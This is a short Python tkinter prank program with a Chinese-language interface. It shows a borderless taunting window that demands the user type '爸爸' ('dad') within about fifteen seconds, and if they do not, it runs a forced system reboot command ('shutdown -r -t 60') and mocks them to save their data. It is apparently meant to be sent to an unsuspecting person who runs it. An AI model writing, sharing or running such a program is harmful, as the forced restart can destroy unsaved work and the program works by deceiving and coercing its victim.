import os
import time
import tkinter
import threading


def move(event):
    global x, y
    new_x = (event.x - x) + root.winfo_x()
    new_y = (event.y - y) + root.winfo_y()
    s = "200x120+" + str(new_x) + "+" + str(new_y)
    root.geometry(s)


def button_1(event):
    global x, y
    x, y = event.x, event.y


def count(label_1, text):
    num = 16
    while num:
        num -= 1
        label_1['text'] = '自动重启时间:%d' % num
        time.sleep(1)
        if (not num) and (text.get() != '爸爸'):
            root.attributes("-alpha", 0)
            os.system('shutdown -r -t 60')
            warn = tkinter.Toplevel()
            warn.overrideredirect(True)
            warn.geometry("200x80+650+300")
            warn_label_1 = tkinter.Label(warn, text='你现在叫爸爸也没有用了!')
            warn_label_2 = tkinter.Label(warn, text='赶快保存你的数据吧!你会后悔的!')
            warn_label_1.pack()
            warn_label_2.pack()
            button = tkinter.Button(warn, text='关闭', command=lambda: os._exit(0))
            button.pack()


def dad(text):
    if text.get() == '爸爸':
        root.attributes("-alpha", 0)
        warn = tkinter.Toplevel()
        warn.overrideredirect(True)
        warn.geometry("100x50+650+300")
        warn_label = tkinter.Label(warn, text='儿砸真乖!')
        warn_label.pack()
        button = tkinter.Button(warn, text='关闭', command=lambda: os._exit(0))
        button.pack()


def main():
    root.geometry("200x120+400+300")
    root.overrideredirect(True)
    label_1 = tkinter.Label(root, text='这你也信哈哈哈\n快叫爸爸,不然重启你电脑!')
    label_1.pack()
    label_2 = tkinter.Label(root)
    label_2.pack()
    text = tkinter.Entry(relief='flat')
    text.pack()
    threading.Thread(target=count, args=(label_2, text)).start()
    button = tkinter.Button(root, text='确定', command=lambda: dad(text))
    button.pack()
    root.bind("<B1-Motion>", move)
    root.bind("<Button-1>", button_1)
    root.mainloop()


if __name__ == '__main__':
    root = tkinter.Tk()
    main()
